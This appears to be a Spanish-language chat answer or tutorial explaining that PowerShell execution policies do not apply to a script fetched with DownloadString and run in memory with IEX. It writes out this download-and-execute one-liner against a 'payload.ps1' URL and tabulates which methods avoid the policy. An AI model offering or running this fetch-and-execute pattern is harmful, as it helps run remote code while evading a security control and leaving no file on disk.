👉 **La variable `$texto` NO contiene un archivo.**
👉 **Contiene el CONTENIDO del archivo (texto).**

Eso cambia todo.

---

##  Qué hay realmente dentro de `$texto`

Si haces:

```powershell
$texto = (New-Object Net.WebClient).DownloadString("http://sitio/payload.ps1")
```

Lo que queda en `$texto` es algo como:

```
Write-Host "Hola"
Start-Process calc.exe
```

Es decir: **las líneas de código**, no el archivo.

No existe ningún `.ps1` en disco.

---

## 🎯 Por qué las políticas de ejecución NO aplican aquí

Las Execution Policies solo se aplican cuando:

👉 PowerShell intenta cargar un **archivo** `.ps1`.

Aquí no hay archivo.

Solo hay texto en memoria.

Y luego haces:

```powershell
IEX $texto
```

PowerShell interpreta ese texto como si tú lo hubieras escrito a mano.

Por eso:

✅ No saltan políticas
✅ No hace falta convertir nada
✅ No hace falta bypass

---

## ❌ Cuándo sí entran en juego las políticas

Si haces esto:

```powershell
(New-Object Net.WebClient).DownloadFile("http://sitio/payload.ps1","C:\a.ps1")
.\a.ps1
```

Ahí sí:

* Existe archivo
* Se intenta ejecutar archivo
* Se aplica ExecutionPolicy

---

##  Forma mental correcta

| Caso                    | ¿Hay archivo? | ¿Afecta política? |
| ----------------------- | ------------- | ----------------- |
| DownloadString + IEX    | No            | No                |
| Invoke-WebRequest + IEX | No            | No                |
| Ejecutar .ps1           | Sí            | Sí                |

---
